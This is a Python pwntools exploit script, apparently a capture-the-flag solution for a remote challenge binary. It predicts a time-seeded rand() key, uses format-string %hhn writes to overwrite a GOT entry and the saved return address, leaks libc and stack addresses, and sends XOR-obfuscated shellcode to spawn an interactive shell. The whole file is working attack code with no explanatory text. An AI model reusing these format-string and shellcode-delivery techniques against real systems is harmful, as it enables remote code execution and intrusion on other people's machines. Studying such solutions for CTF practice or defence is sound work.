#!/usr/bin/env python3
from pwn import *
import time, ctypes

exe  = context.binary = ELF(args.EXE or './chall')
libc = ELF(exe.libc.path)

def obfuscated_xor_hex(data: bytes, key: int) -> str:
    k = key & 0xff
    out = bytearray()

    for b in data:
        out.append(b ^ k)
        k = (k * 0x17 + 7) & 0xff

    return out.hex()

io = remote("ctf.nexus-security.club", 1802) ; ts = int(time.time()) + 1
c_lib = ctypes.CDLL("libc.so.6") ; c_lib.srand(ts) ; c_lib.rand() ; c_lib.rand() ; r = c_lib.rand() ; key = ((r & 0xFF) + ((r // 0xFF) & 0xFF)) & 0xFF

io.sendlineafter(b": ", b"%165x%14$hhn%112x%15$hhn".ljust(32, b' ') + p64(exe.got.exit) + p64(exe.got.exit+1))
io.sendlineafter(b": ", b"Z"*8)

io.sendlineafter(b": ", b"%6$p.%7$p")
leaks = io.recvline().strip().split(b'.')
libc.address = int(leaks[1], 16) - 0x1f6000
rip          = int(leaks[0], 16) + 1064 - 1008 - 344
mmap_chunk   = libc.address - 0x4000

io.sendlineafter(b": ", b"Z"*8)

payload  = b''
payload += b"%14$hhn" 
payload += f"%{(mmap_chunk >> 8) & 0xff}x".encode() + b'%15$hhn'
payload += f"%{((mmap_chunk >> 16) & 0xff)-((mmap_chunk >> 8) & 0xff)}x".encode() + b'%16$hhn'
payload  = payload.ljust(32, b'\x00') + p64(rip) + p64(rip+1) + p64(rip+2)

io.sendlineafter(b": ", payload)
io.sendlineafter(b": ", obfuscated_xor_hex(asm(shellcraft.sh()), key).encode())
io.interactive()
